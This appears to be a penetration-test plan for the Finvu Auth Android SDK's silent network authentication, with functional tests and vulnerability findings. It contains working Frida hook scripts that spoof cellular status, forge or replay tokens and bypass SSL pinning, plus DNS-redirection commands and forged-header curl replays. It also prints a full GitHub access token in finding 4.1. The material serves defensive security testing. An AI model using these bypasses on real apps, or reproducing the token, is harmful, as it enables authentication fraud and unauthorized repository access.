# Finvu Auth SDK Android — Testing Approach & Bypass Test Cases

## Architecture Summary

The SDK implements **Silent Network Authentication (SNA)** — when a device is on mobile data, the operator verifies the phone number without OTP. The flow:

1. **`initAuth()`** — Reads MCC/MNC from `TelephonyManager` → returns PLMN to caller
2. **`startAuth(snaUri)`** — Forces an HTTP GET over **cellular only** via `ConnectivityManager.requestNetwork()`, follows up to 15 redirects
3. The SNA URL hits operator domains (`sekuramobile.com`, `jio.com`, `ipification.com`, `airtel.in`) which return a token on success, or trigger OTP fallback on the WebView

### Key Components

| Component | File | Purpose |
|-----------|------|---------|
| `FinvuAuthenticationWrapper` | `FinvuAuthenticationWrapper.kt` | WebView-based entry point, sets up JS bridge |
| `FinvuAuthenticationNativeWrapper` | `FinvuAuthenticationNativeWrapper.kt` | Native API entry point |
| `FinvuAuthenticationBridge` | `FinvuAuthenticationBridge.kt` | JS ↔ native bridge (`@JavascriptInterface`) |
| `FinvuAuthenticationRepository` | `FinvuAuthenticationRepository.kt` | Orchestrates initAuth + startAuth, cellular precheck |
| `FinvuCellularSnaClient` | `FinvuCellularSnaClient.kt` | Forces cellular network, builds scoped OkHttpClient, follows redirect chain |
| `FinvuTelephonyMccMnc` | `FinvuTelephonyMccMnc.kt` | Reads MCC/MNC from TelephonyManager |
| `FinvuAuthLogManager` | `FinvuAuthLogManager.kt` | Posts auth events to Finvu logging endpoint |
| `SecureLog` | `SecureLog.kt` | Sanitized logging (debug builds only) |

### SNA Authentication Flow (Sequence)

```
WebView/Native → initAuth()
                     │
                     ├─ precheckCellularAvailability()
                     │      └─ FinvuCellularSnaClient.isCellularAvailable()
                     │             └─ checks allNetworks for TRANSPORT_CELLULAR + NET_CAPABILITY_INTERNET
                     │
                     └─ FinvuTelephonyMccMnc.read()
                            └─ TelephonyManager.networkOperator / simOperator
                            └─ Returns Plmn(mcc, mnc)

                startAuth(snaUri)
                     │
                     ├─ precheckCellularAvailability() ← same check again
                     │
                     └─ FinvuCellularSnaClient.getOverCellular()
                            │
                            ├─ ConnectivityManager.requestNetwork()
                            │      └─ removeTransportType(WIFI)
                            │      └─ removeTransportType(BLUETOOTH)
                            │      └─ addTransportType(CELLULAR)
                            │
                            ├─ onAvailable(network)
                            │      └─ buildCellularClient(network)
                            │             └─ socketFactory = network.socketFactory
                            │             └─ dns = network.getAllByName(hostname)
                            │
                            └─ executeSnaRedirectChain(client, snaUri)
                                   └─ Up to 15 redirects
                                   └─ Extracts snaToken from final response body
```

---

## Phase 1: SNA Flow Pre-Condition Testing

| # | Test Case | What to Verify | Steps |
|---|-----------|----------------|-------|
| 1.1 | initAuth on device with no SIM | MCC/MNC returns empty strings — `Plmn("", "")`. Verify response JSON is still valid (`{status: "SUCCESS", mcc: "", mnc: ""}`) | Remove SIM → Launch app → Tap "InitAuth" → Verify UI shows empty MCC/MNC but no crash |
| 1.2 | initAuth without READ_PHONE_STATE permission | `TelephonyManager` returns empty PLMN. Confirm app shows permission-denial toast | Revoke `READ_PHONE_STATE` via ADB: `adb shell pm revoke <pkg> android.permission.READ_PHONE_STATE` → Tap "InitAuth" → Verify toast "READ_PHONE_STATE denied" appears and MCC/MNC are empty |
| 1.3 | initAuth on Wi-Fi-only device (no cellular) | `isCellularAvailable()` returns `false` → `SNA_CELLULAR_UNAVAILABLE` | Airplane mode → Enable Wi-Fi only → Tap "InitAuth" → Verify error response `SNA_CELLULAR_UNAVAILABLE` |
| 1.4 | initAuth with cellular present but Wi-Fi active | `isCellularAvailable()` returns `true` — initAuth should succeed | Connect to Wi-Fi + mobile data → Tap "InitAuth" → Verify MCC/MNC populated correctly |

---

## Phase 2: Cellular Network Binding & SNA Request Testing

| # | Test Case | What to Verify | Steps |
|---|-----------|----------------|-------|
| 2.1 | startAuth on mobile data (SNA success path) | `requestNetwork()` acquires cellular. OkHttpClient uses `network.socketFactory`. Redirect chain completes, `snaToken` extracted | Mobile data on, Wi-Fi off → Enter valid SNA URL → Tap "StartAuth" → Verify success response with `snaToken` |
| 2.2 | startAuth on Wi-Fi (cellular available but not default) | SNA request routes through cellular, not Wi-Fi | Wi-Fi + mobile data both on → Enter valid SNA URL → Tap "StartAuth" → Use `adb shell dumpsys connectivity` to verify request went over cellular → Verify success |
| 2.3 | startAuth when cellular completely unavailable | `onUnavailable()` fires → `SNA_CELLULAR_UNAVAILABLE` | Airplane mode → Tap "StartAuth" → Verify `SNA_CELLULAR_UNAVAILABLE` error |
| 2.4 | startAuth when cellular drops mid-request | `onLost()` fires → `SNA_CELLULAR_UNAVAILABLE`. No hanging callbacks | Start auth → During redirect chain, toggle airplane mode on → Verify error response and no ANR |
| 2.5 | startAuth total timeout (90s) | `SNA_TOTAL_TIMEOUT_MS` fires → `SNA_CELLULAR_TIMEOUT` | Use Frida to intercept and stall the OkHttpClient (or use a slow-responding URL) → Verify timeout after 90s |
| 2.6 | startAuth network request timeout (10s) | Legacy `Timer` path on pre-Oreo → `SNA_CELLULAR_UNAVAILABLE` | Test on API < 26 emulator or use Frida to mock `Build.VERSION.SDK_INT` → Verify 10s timeout |
| 2.7 | URL validation | Non-HTTP URLs rejected with `INVALID_SNA_URI` | Enter `javascript:alert(1)`, `ftp://example.com`, empty string → Verify each returns `INVALID_SNA_URI` |

---

## Phase 3: Redirect Chain & Response Parsing Testing

| # | Test Case | What to Verify | Steps |
|---|-----------|----------------|-------|
| 3.1 | Happy path redirect chain | SNA URL 302-redirects → final response with `snaToken`. Each hop logged via `FinvuAuthLogManager.logSnaHop()` | Enter valid SNA URL on mobile data → Monitor logcat for `SNA: hop #0`, `hop #1`, etc. → Verify final response contains `snaToken` |
| 3.2 | Redirect with no Location header | Chain stops, returns current status code | Use Frida to mock server returning 302 with no Location → Verify chain terminates gracefully |
| 3.3 | Redirect to unsupported scheme | `IOException("SNA redirect blocked: unsupported scheme")` | Use Frida or proxy to inject `Location: intent://malicious` → Verify error |
| 3.4 | Redirect exceeds 15 hops | `IOException("SNA exceeded 15 redirects")` | Use Frida to inject 16+ redirect hops → Verify error after 15 |
| 3.5 | Unresolvable redirect Location | `IOException("SNA redirect blocked: unresolvable Location")` | Inject `Location: http://[::1]/` or malformed URL → Verify error |
| 3.6 | snaToken extraction | Token extracted when present, null when body is empty/non-JSON | Use Frida to mock response bodies: `{}`, `{"snaToken": "abc123"}`, empty body, invalid JSON → Verify each case |
| 3.7 | Response body logging truncation | Body > 1024 chars truncated in logs | Use Frida to inject a large response body → Check logcat for `…[truncated]` |

---

## Phase 4: Security & Vulnerability Findings

| # | Issue | Severity | Details | Location |
|---|-------|----------|---------|----------|
| 4.1 | **Hardcoded GitHub PAT in build.gradle.kts** | CRITICAL | `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` is committed in the publishing block. Anyone with repo access can use this token to push to the GitHub Packages registry or potentially access other repo resources | `FinvuAuthenticationWrapperSDK/build.gradle.kts:103` |
| 4.2 | **Cleartext traffic allowed to SNA domains** | HIGH | `domain-config cleartextTrafficPermitted="true"` for `80.in.safr.sekuramobile.com`, `partnerapi.jio.com`, `in-vil.ipification.com`, `api-csp.airtel.in`. If SNA redirect chain uses HTTP, tokens are exposed on the wire | `finvu_silent_network_authentication_network_security_config.xml` |
| 4.3 | **SNA URL passed via JS bridge without validation** | MEDIUM | `startAuth(snaUri)` JavaScript interface accepts any URL string. No allowlist, no signature verification, no domain validation. A compromised WebView could inject a malicious URL to exfil tokens or redirect traffic | `FinvuAuthenticationBridge.kt:112` |
| 4.4 | **Singleton instances not thread-safe** | MEDIUM | `FinvuAuthenticationRepository`, `FinvuAuthHttpManager`, `FinvuAuthLogManager` use non-thread-safe singleton patterns. `FinvuAuthenticationRepository` uses `if (singletonInstance == null) singletonInstance = FinvuAuthenticationRepository()` without synchronization — race conditions could create multiple instances | Multiple files |
| 4.5 | **Logging in debug builds may leak sanitized data** | LOW | `SecureLog` regex `\d{4,8}` matches non-OTP numeric strings. Debug logging is enabled with `ENABLE_LOGGING=true` and `IS_PRODUCTION=false`. Sanitization prefixes everything with `[SANITIZED]` which itself reveals that data was present | `SecureLog.kt` |
| 4.6 | **Race condition in callback completion** | LOW | In `getOverCellular()`, `onAvailable` and `onUnavailable` could race if cellular briefly connects then disconnects. `AtomicBoolean finished` prevents duplicate completions but `onLost` could still fire after `onAvailable` has started the IO executor | `FinvuCellularSnaClient.kt:279-346` |

---

## Phase 5: SNA Bypass & OTP Bypass Test Cases (Rooted Device + Frida)

> **Goal**: Determine if authentication can be bypassed when the device is NOT on mobile data (Wi-Fi or Bluetooth), without detection.

### Understanding the Security Model

The SNA security relies on **two layers**:

1. **Client-side enforcement** — The SDK forces the HTTP request through cellular via `ConnectivityManager.requestNetwork()` with Wi-Fi/Bluetooth removed
2. **Server-side verification** — The operator's SNA server checks that the request's source IP belongs to their mobile network range

**Key insight**: Even if we bypass the client-side enforcement, the server should reject the request because it arrives from a Wi-Fi IP. The bypass tests below verify whether this server-side check actually holds.

---

### TC-BYPASS-01: Hook `isCellularAvailable()` to Return `true` on Wi-Fi

**Objective**: Trick the SDK into believing cellular is available when only Wi-Fi is connected.

**Prerequisites**: Rooted device, Frida installed, Wi-Fi connected, mobile data OFF.

**Frida Script**:

```javascript
// frida -U -f <package_name> -l bypass_isCellularAvailable.js

Java.perform(function() {
    var FinvuCellularSnaClient = Java.use(
        "com.finvu.android.authenticationwrapper.manager.FinvuCellularSnaClient"
    );

    // Hook isCellularAvailable to always return true
    FinvuCellularSnaClient.isCellularAvailable.implementation = function(ctx) {
        console.log("[BYPASS] isCellularAvailable() called — returning true");
        return true;
    };

    // Also hook isOnCellularNetwork for good measure
    FinvuCellularSnaClient.isOnCellularNetwork.implementation = function(ctx) {
        console.log("[BYPASS] isOnCellularNetwork() called — returning true");
        return true;
    };
});
```

**Expected Result**: `initAuth()` passes the precheck but `startAuth()` will still fail at `ConnectivityManager.requestNetwork()` because no cellular network exists to bind to. The `onUnavailable()` callback fires → `SNA_CELLULAR_UNAVAILABLE`.

**What This Proves**: The client-side cellular check is not the only enforcement. Even if bypassed, `requestNetwork()` for cellular fails when no cellular hardware is active.

---

### TC-BYPASS-02: Hook `ConnectivityManager.requestNetwork()` to Return Wi-Fi Network

**Objective**: Make the SDK think it acquired a cellular network when it actually got the Wi-Fi network.

**Prerequisites**: Rooted device, Frida, Wi-Fi connected, mobile data OFF.

**Frida Script**:

```javascript
// frida -U -f <package_name> -l bypass_requestNetwork.js

Java.perform(function() {
    var ConnectivityManager = Java.use("android.net.ConnectivityManager");
    var NetworkRequest = Java.use("android.net.NetworkRequest");
    var NetworkCallback = Java.use("android.net.ConnectivityManager$NetworkCallback");

    // Hook requestNetwork to call onAvailable with the Wi-Fi network
    ConnectivityManager.requestNetwork.overload(
        "android.net.NetworkRequest",
        "android.net.ConnectivityManager$NetworkCallback",
        "int"
    ).implementation = function(request, callback, timeoutMs) {
        console.log("[BYPASS] requestNetwork called — injecting Wi-Fi network as cellular");

        // Get the active (Wi-Fi) network
        var activeNetwork = this.getActiveNetwork();
        console.log("[BYPASS] Active network (Wi-Fi): " + activeNetwork);

        if (activeNetwork !== null) {
            // Call onAvailable with the Wi-Fi network instead of cellular
            // This tricks the SDK into building an OkHttpClient on Wi-Fi
            callback.onAvailable(activeNetwork);
        } else {
            console.log("[BYPASS] No active network — calling onUnavailable");
            callback.onUnavailable();
        }
    };
});
```

**Expected Result**: The SDK builds an OkHttpClient using `activeNetwork.socketFactory` (which is Wi-Fi). The SNA request is sent over Wi-Fi. The operator server sees a Wi-Fi IP → **SNA should fail server-side** and the auth page should fall back to OTP.

**What This Proves**: Even with a fully bypassed client, the server-side IP check prevents SNA from succeeding on Wi-Fi.

**Key Observation**: Check whether the server returns a different error vs. a successful response with an empty/invalid token. This reveals if the server validates source IP.

---

### TC-BYPASS-03: Hook `OkHttpClient` to Use Default Socket Factory (Remove Cellular Binding)

**Objective**: Replace the cellular-scoped OkHttpClient with a default one that routes through Wi-Fi.

**Prerequisites**: Rooted device, Frida, Wi-Fi connected, mobile data OFF.

**Frida Script**:

```javascript
// frida -U -f <package_name> -l bypass_okhttp.js

Java.perform(function() {
    var FinvuCellularSnaClient = Java.use(
        "com.finvu.android.authenticationwrapper.manager.FinvuCellularSnaClient"
    );
    var OkHttpClient = Java.use("okhttp3.OkHttpClient");
    var TimeUnit = Java.use("java.util.concurrent.TimeUnit");

    // Hook buildCellularClient to return a default OkHttpClient
    // that does NOT use network.socketFactory or network.getAllByName
    FinvuCellularSnaClient.buildCellularClient.implementation = function(network) {
        console.log("[BYPASS] buildCellularClient called — returning default OkHttpClient (no cellular binding)");

        var builder = OkHttpClient.Builder.$new();
        builder.followRedirects(false);
        builder.followSslRedirects(false);
        builder.connectTimeout(30000, TimeUnit.MILLISECONDS);
        builder.readTimeout(60000, TimeUnit.MILLISECONDS);
        // NOTE: No .socketFactory() and no .dns() — uses default (Wi-Fi)
        var client = builder.build();
        console.log("[BYPASS] Default OkHttpClient created (routes via Wi-Fi)");
        return client;
    };
});
```

**Expected Result**: The SNA request is sent over Wi-Fi without cellular binding. The operator server should reject it based on source IP.

**What This Proves**: The `buildCellularClient()` binding is the critical client-side enforcement. Removing it routes SNA over Wi-Fi — but server-side checks should still prevent auth.

---

### TC-BYPASS-04: Intercept and Replay a Valid `snaToken`

**Objective**: Capture a valid `snaToken` from a successful SNA session (on mobile data), then replay it in a Wi-Fi-only session.

**Prerequisites**: Rooted device, Frida, two sessions (one on mobile data, one on Wi-Fi).

**Step 1 — Capture valid snaToken (mobile data)**:

```javascript
// frida -U -f <package_name> -l capture_snaToken.js

Java.perform(function() {
    var FinvuSnaStartResponse = Java.use(
        "com.finvu.android.authenticationwrapper.models.FinvuSnaStartResponse"
    );

    // Hook the FinvuSnaStartResponse constructor to capture the token
    FinvuSnaStartResponse.$init.implementation = function(status, httpStatusCode, finalUrl, snaToken) {
        console.log("[CAPTURE] FinvuSnaStartResponse created");
        console.log("[CAPTURE]   status: " + status);
        console.log("[CAPTURE]   httpStatusCode: " + httpStatusCode);
        console.log("[CAPTURE]   finalUrl: " + finalUrl);
        console.log("[CAPTURE]   snaToken: " + snaToken);
        return this.$init(status, httpStatusCode, finalUrl, snaToken);
    };

    // Also hook the response utility
    var FinvuAuthResponseUtils = Java.use(
        "com.finvu.android.authenticationwrapper.utils.FinvuAuthResponseUtils"
    );

    FinvuAuthResponseUtils.createJsonFromAuthResponse.implementation = function(response) {
        var result = this.createJsonFromAuthResponse(response);
        console.log("[CAPTURE] Full response JSON: " + result.toString());
        return result;
    };
});
```

**Step 2 — Replay the token on Wi-Fi**:

```javascript
// frida -U -f <package_name> -l replay_snaToken.js

Java.perform(function() {
    var FinvuSnaStartResponse = Java.use(
        "com.finvu.android.authenticationwrapper.models.FinvuSnaStartResponse"
    );

    // Replace the startAuth response with the captured token
    FinvuSnaStartResponse.$init.implementation = function(status, httpStatusCode, finalUrl, snaToken) {
        console.log("[REPLAY] Intercepting FinvuSnaStartResponse");
        console.log("[REPLAY]   Original snaToken: " + snaToken);

        // Inject the previously captured token
        var REPLAYED_TOKEN = "CAPTURED_TOKEN_HERE"; // Replace with captured token
        console.log("[REPLAY]   Replaced snaToken: " + REPLAYED_TOKEN);

        return this.$init("SUCCESS", 200, finalUrl, REPLAYED_TOKEN);
    };
});
```

**Expected Result**: The WebView receives a forged `snaToken` that was originally issued for a different session/IP. The auth server should reject it if:
- The token is bound to the original session IP
- The token has a short expiry window
- The token is nonce-based (single-use)

**What This Proves**: Whether the server validates token binding (IP, session, nonce). If the replayed token is accepted, this is a **critical bypass**.

---

### TC-BYPASS-05: Hook `FinvuAuthenticationBridge.startAuth()` to Inject Custom SNA URL

**Objective**: Inject a malicious or intercepted SNA URL via the JavaScript bridge to observe what domains the SDK will contact and whether it validates the URL domain.

**Prerequisites**: Rooted device, Frida, Wi-Fi connected.

**Frida Script**:

```javascript
// frida -U -f <package_name> -l bypass_sna_uri_injection.js

Java.perform(function() {
    var FinvuAuthenticationBridge = Java.use(
        "com.finvu.android.authenticationwrapper.bridge.FinvuAuthenticationBridge"
    );

    // Hook startAuth to log and optionally modify the URI
    FinvuAuthenticationBridge.startAuth.implementation = function(snaUri, callbackName) {
        console.log("[BYPASS] startAuth called with URI: " + snaUri);
        console.log("[BYPASS]   callbackName: " + callbackName);

        // Test: inject a custom URL (attacker-controlled server)
        // var maliciousUri = "https://attacker-controlled.example.com/sna";
        // console.log("[BYPASS]   Replacing with: " + maliciousUri);
        // this.startAuth(maliciousUri, callbackName);

        // Or pass through to observe the real flow
        this.startAuth(snaUri, callbackName);
    };
});
```

**What This Proves**: The SDK does not validate the SNA URL domain against an allowlist. An attacker who can inject JavaScript into the WebView (e.g., via XSS on the auth page) could redirect SNA traffic to their own server.

---

### TC-BYPASS-06: Hook `FinvuCellularSnaClient.executeSnaRedirectChain()` to Capture Full Redirect Chain

**Objective**: Capture every hop of the SNA redirect chain, including all URLs, headers, and response bodies. This reveals the exact authentication protocol and whether tokens are transmitted in cleartext URLs.

**Prerequisites**: Rooted device, Frida, mobile data ON.

**Frida Script**:

```javascript
// frida -U -f <package_name> -l capture_redirect_chain.js

Java.perform(function() {
    // Hook the OkHttpClient to log all requests and responses
    var OkHttpClient = Java.use("okhttp3.OkHttpClient");
    var Request = Java.use("okhttp3.Request");
    var Response = Java.use("okhttp3.Response");

    // Hook at the OkHttp Call level to capture everything
    var RealCall = Java.use("okhttp3.internal.connection.RealCall");

    // Alternative: hook the execute method inside FinvuCellularSnaClient
    // by hooking the response body reading

    // Hook SecureLog.d to capture all debug messages
    var SecureLog = Java.use(
        "com.finvu.android.authenticationwrapper.utils.SecureLog"
    );

    SecureLog.d.implementation = function(message) {
        console.log("[SNA_LOG] " + message);
        return this.d(message);
    };

    SecureLog.e.implementation = function(message, throwable) {
        console.log("[SNA_ERROR] " + message);
        return this.e(message, throwable);
    };

    SecureLog.w.implementation = function(message) {
        console.log("[SNA_WARN] " + message);
        return this.w(message);
    };

    // Also hook the readAndLogBody method to capture response bodies
    FinvuCellularSnaClient = Java.use(
        "com.finvu.android.authenticationwrapper.manager.FinvuCellularSnaClient"
    );

    FinvuCellularSnaClient.readAndLogBody.implementation = function(response, hop) {
        console.log("[SNA_BODY] Reading body for hop #" + hop);
        var result = this.readAndLogBody(response, hop);
        // The body is also logged via SecureLog, so we'll see it above
        return result;
    };
});
```

**What This Proves**: Reveals whether tokens are transmitted in URL query parameters (vulnerable to referrer leakage), whether any hop uses HTTP instead of HTTPS, and the exact sequence of operator endpoints involved in SNA.

---

### TC-BYPASS-07: Intercept SNA Response to Fake a Success Response on Wi-Fi

**Objective**: When on Wi-Fi, intercept the SNA response (which will fail server-side) and replace it with a fake success response containing a fabricated `snaToken`.

**Prerequisites**: Rooted device, Frida, Wi-Fi connected, mobile data OFF.

**Frida Script**:

```javascript
// fruda -U -f <package_name> -l fake_sna_success.js

Java.perform(function() {
    // Bypass the cellular precheck
    var FinvuCellularSnaClient = Java.use(
        "com.finvu.android.authenticationwrapper.manager.FinvuCellularSnaClient"
    );
    FinvuCellularSnaClient.isCellularAvailable.implementation = function(ctx) {
        console.log("[BYPASS] isCellularAvailable → true (spoofed)");
        return true;
    };

    // Hook the redirect chain outcome to return a fake success
    FinvuCellularSnaClient.getOverCellular.implementation = function(ctx, uriString, entityId, requestId, completion) {
        console.log("[BYPASS] getOverCellular called with URI: " + uriString);
        console.log("[BYPASS] Returning fake success outcome");

        // Create a fake Outcome with a fabricated snaToken
        var Outcome = Java.use(
            "com.finvu.android.authenticationwrapper.manager.FinvuCellularSnaClient$Outcome"
        );

        var fakeOutcome = Outcome.$new(
            200,                                                    // httpStatusCode
            "https://webvwlive.finvu.in/auth/success",             // finalUrl
            '{"status":"SUCCESS","snaToken":"BYPASSED_TOKEN_12345"}' // responseBody
        );

        // Call completion on the main thread
        var Handler = Java.use("android.os.Handler");
        var Looper = Java.use("android.os.Looper");
        var Result = Java.use("kotlin.Result");

        var mainHandler = Handler.$new(Looper.getMainLooper());
        mainHandler.post(Java.registerClass({
            name: "com.finvu.bypass.Runnable",
            implements: [Java.use("java.lang.Runnable")],
            methods: {
                run: function() {
                    completion(Result.success(fakeOutcome));
                }
            }
        }).$new());
    };
});
```

**Expected Result**: The SDK reports SNA success to the WebView with a fake `snaToken`. The WebView/auth page then sends this token to the auth server. **The server should reject this token** because it was never issued by the operator.

**What This Proves**: If the auth server accepts the fake token, the entire SNA flow is bypassable — the server doesn't validate the token with the operator. This would be a **critical vulnerability**.

---

### TC-BYPASS-08: Hook `ConnectivityManager` to Provide Fake Cellular Network Object on Wi-Fi

**Objective**: The most comprehensive bypass — make `requestNetwork()` return the Wi-Fi network as if it were cellular, and make `network.socketFactory` and `network.getAllByName()` use the Wi-Fi network's implementations.

**Prerequisites**: Rooted device, Frida, Wi-Fi connected, mobile data OFF.

**Frida Script**:

```javascript
// frida -U -f <package_name> -l bypass_full_cellular_spoof.js

Java.perform(function() {
    var ConnectivityManager = Java.use("android.net.ConnectivityManager");
    var NetworkCapabilities = Java.use("android.net.NetworkCapabilities");

    // 1. Hook isCellularAvailable
    var FinvuCellularSnaClient = Java.use(
        "com.finvu.android.authenticationwrapper.manager.FinvuCellularSnaClient"
    );
    FinvuCellularSnaClient.isCellularAvailable.implementation = function(ctx) {
        console.log("[BYPASS] isCellularAvailable → true");
        return true;
    };

    // 2. Hook getActiveNetwork to return Wi-Fi network
    ConnectivityManager.getActiveNetwork.implementation = function() {
        var realNetwork = this.getActiveNetwork();
        console.log("[BYPASS] getActiveNetwork → " + realNetwork + " (Wi-Fi spoofed as cellular)");
        return realNetwork;
    };

    // 3. Hook getNetworkCapabilities to claim TRANSPORT_CELLULAR on the Wi-Fi network
    ConnectivityManager.getNetworkCapabilities.implementation = function(network) {
        var realCaps = this.getNetworkCapabilities(network);
        if (realCaps !== null) {
            console.log("[BYPASS] Adding TRANSPORT_CELLULAR to network capabilities");
            // Add cellular transport to the capabilities
            var builder = NetworkCapabilities.Builder.$new();
            // Copy existing capabilities
            var transportTypes = [NetworkCapabilities.TRANSPORT_WIFI, NetworkCapabilities.TRANSPORT_CELLULAR];
            for (var i = 0; i < transportTypes.length; i++) {
                builder.addTransportType(transportTypes[i]);
            }
            builder.addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET);
            builder.addCapability(NetworkCapabilities.NET_CAPABILITY_NOT_METERED);
            return builder.build();
        }
        return realCaps;
    };

    // 4. Hook requestNetwork to immediately call onAvailable with the Wi-Fi network
    ConnectivityManager.requestNetwork.overload(
        "android.net.NetworkRequest",
        "android.net.ConnectivityManager$NetworkCallback",
        "int"
    ).implementation = function(request, callback, timeoutMs) {
        console.log("[BYPASS] requestNetwork — injecting Wi-Fi network as cellular");
        var wifiNetwork = this.getActiveNetwork();
        if (wifiNetwork !== null) {
            // Invoke onAvailable with the Wi-Fi network
            // The SDK will build an OkHttpClient using this network's socketFactory
            // Since this IS the Wi-Fi network, the request goes over Wi-Fi
            callback.onAvailable(wifiNetwork);
        } else {
            console.log("[BYPASS] No active network — calling onUnavailable");
            callback.onUnavailable();
        }
    };
});
```

**Expected Result**: The SDK successfully builds a "cellular" OkHttpClient that actually routes over Wi-Fi. The SNA request reaches the operator server from a Wi-Fi IP. The server should reject it.

**What This Proves**: This is the most complete client-side bypass. If the server still rejects it, the client-side bypass is confirmed as insufficient — **the security model holds at the server level**.

---

### TC-BYPASS-09: Manipulate `FinvuTelephonyMccMnc` to Spoof Operator Identity

**Objective**: Forge MCC/MNC values to impersonate a different operator. Some SNA servers may use MCC/MNC to route the request to the correct operator's verification endpoint.

**Prerequisites**: Rooted device, Frida.

**Frida Script**:

```javascript
// frida -U -f <package_name> -l spoof_mcc_mnc.js

Java.perform(function() {
    var FinvuTelephonyMccMnc = Java.use(
        "com.finvu.android.authenticationwrapper.utils.FinvuTelephonyMccMnc"
    );
    var Plmn = Java.use(
        "com.finvu.android.authenticationwrapper.utils.FinvuTelephonyMccMnc$Plmn"
    );

    FinvuTelephonyMccMnc.read.implementation = function(ctx) {
        console.log("[SPOOF] TelephonyMccMnc.read called — returning forged PLMN");

        // Example: Spoof as Jio (MCC 405, MNC 840)
        // Or Airtel (MCC 404, MNC 10)
        var spoofedPlmn = Plmn.$new("405", "840");
        console.log("[SPOOF] MCC=" + spoofedPlmn.mcc.value + " MNC=" + spoofedPlmn.mnc.value);
        return spoofedPlmn;
    };
});
```

**What This Proves**: Whether MCC/MNC is used by the server for routing or validation. If the server routes based on MCC/MNC and does not validate against the actual network, this could redirect SNA verification to a different operator's endpoint.

---

### TC-BYPASS-10: SNA URL Extraction & External Replay

**Objective**: Extract the SNA URL from the SDK, then call it from a different device/network (laptop on Wi-Fi) using curl to test if the URL alone is sufficient for authentication.

**Prerequisites**: Rooted device, mobile data ON, laptop on a different network.

**Step 1 — Extract SNA URL**:

```javascript
// frida -U -f <package_name> -l extract_sna_url.js

Java.perform(function() {
    var FinvuAuthenticationBridge = Java.use(
        "com.finvu.android.authenticationwrapper.bridge.FinvuAuthenticationBridge"
    );

    FinvuAuthenticationBridge.startAuth.implementation = function(snaUri, callbackName) {
        console.log("[EXTRACT] SNA URL: " + snaUri);
        console.log("[EXTRACT] Callback: " + callbackName);

        // Also extract from initConfig
        var initConfig = this.initConfig.value; // access private field
        if (initConfig !== null) {
            console.log("[EXTRACT] initConfig: " + initConfig.toString());
        }

        this.startAuth(snaUri, callbackName);
    };

    // Also hook the redirect chain to capture all redirect URLs
    var FinvuCellularSnaClient = Java.use(
        "com.finvu.android.authenticationwrapper.manager.FinvuCellularSnaClient"
    );

    FinvuCellularSnaClient.executeSnaRedirectChain.implementation = function(client, startUrl, entityId, requestId) {
        console.log("[EXTRACT] Redirect chain start: " + startUrl);
        console.log("[EXTRACT] entityId: " + entityId);
        console.log("[EXTRACT] requestId: " + requestId);

        var outcome = this.executeSnaRedirectChain(client, startUrl, entityId, requestId);
        console.log("[EXTRACT] Final URL: " + outcome.finalUrl.value);
        console.log("[EXTRACT] Status code: " + outcome.httpStatusCode.value);
        console.log("[EXTRACT] Response body: " + outcome.responseBody.value);
        return outcome;
    };
});
```

**Step 2 — Replay from laptop**:

```bash
# On laptop (Wi-Fi network, NOT mobile data)
# Replace URL with the extracted SNA URL

# Test 1: Direct curl (no mobile data IP)
curl -v -L "EXTRACTED_SNA_URL" \
  -H "User-Agent: FinvuAuthSDK-Android/1.0.1" \
  -H "Connection: close"

# Test 2: With forged headers
curl -v -L "EXTRACTED_SNA_URL" \
  -H "User-Agent: FinvuAuthSDK-Android/1.0.1" \
  -H "X-Forwarded-For: <mobile_operator_ip>" \
  -H "Connection: close"

# Test 3: Time-based replay (call the URL multiple times)
# First on mobile data (success), then immediately on Wi-Fi
for i in {1..5}; do
  echo "--- Attempt $i ---"
  curl -s -o /dev/null -w "HTTP %{http_code}\n" "EXTRACTED_SNA_URL"
  sleep 1
done
```

**What This Proves**: 
- Whether the SNA URL is a one-time-use nonce (replay should fail)
- Whether the server validates source IP (Wi-Fi IP should fail)
- Whether `X-Forwarded-For` header bypasses IP validation (should NOT work on a properly implemented system)

---

### TC-BYPASS-11: Intercept WebView Traffic to Understand Full Auth Flow

**Objective**: Capture the complete authentication flow between the WebView and the auth server, including what happens after SNA succeeds or fails, and how OTP fallback is triggered.

**Prerequisites**: Rooted device, mitmproxy or Burp Suite, certificate pinning bypass (if any).

**Steps**:

```bash
# 1. Set up mitmproxy on host machine
mitmproxy --listen-port 8080

# 2. Configure device proxy
adb shell settings put global http_proxy <host_ip>:8080

# 3. Install mitmproxy CA cert on device
adb push mitmproxy-ca-cert.pem /sdcard/
# Then: Settings → Security → Install from storage

# 4. If certificate pinning exists, use Frida to bypass it
# frida -U -f <package_name> -l ssl_bypass.js
```

**Frida SSL Pinning Bypass** (if needed):

```javascript
// ssl_bypass.js — generic Android SSL pinning bypass
Java.perform(function() {
    // Bypass TrustManager
    var X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
    var SSLContext = Java.use("javax.net.ssl.SSLContext");

    var TrustManager = Java.registerClass({
        name: "com.bypass.TrustManager",
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });

    SSLContext.init.overload("[Ljavax.net.ssl.TrustManager;", "java.security.SecureRandom").implementation = function(tms, sr) {
        console.log("[SSL] Bypassing SSL pinning");
        this.init(Java.array("javax.net.ssl.TrustManager", [TrustManager.$new()]), null);
    };
});
```

**What to Look For**:
- The full URL flow: initial SNA URL → redirect chain → final auth endpoint
- What parameters are in the URL (tokens, session IDs, phone number hints)
- What the server returns on SNA success vs. SNA failure
- How the WebView transitions from SNA to OTP flow
- Whether any sensitive data is transmitted in cleartext

---

### TC-BYPASS-12: DNS Redirection Attack on SNA Domains

**Objective**: Test whether modifying DNS resolution for SNA domains (via `/etc/hosts` on rooted device) can redirect SNA traffic to an attacker-controlled server.

**Prerequisites**: Rooted device, ADB.

**Steps**:

```bash
# 1. On rooted device, remount /system as writable
adb shell su -c "mount -o rw,remount /"

# 2. Add DNS overrides for SNA domains
adb shell su -c "echo '192.168.1.100 80.in.safr.sekuramobile.com' >> /etc/hosts"
adb shell su -c "echo '192.168.1.100 partnerapi.jio.com' >> /etc/hosts"
adb shell su -c "echo '192.168.1.100 in-vil.ipification.com' >> /etc/hosts"
adb shell su -c "echo '192.168.1.100 api-csp.airtel.in' >> /etc/hosts"

# 3. Set up a listener on 192.168.1.100:443 (or 80 for cleartext)
# python3 -m http.server 80

# 4. Launch the app and trigger SNA

# 5. Restore original hosts file after testing
adb shell su -c "mount -o ro,remount /"
```

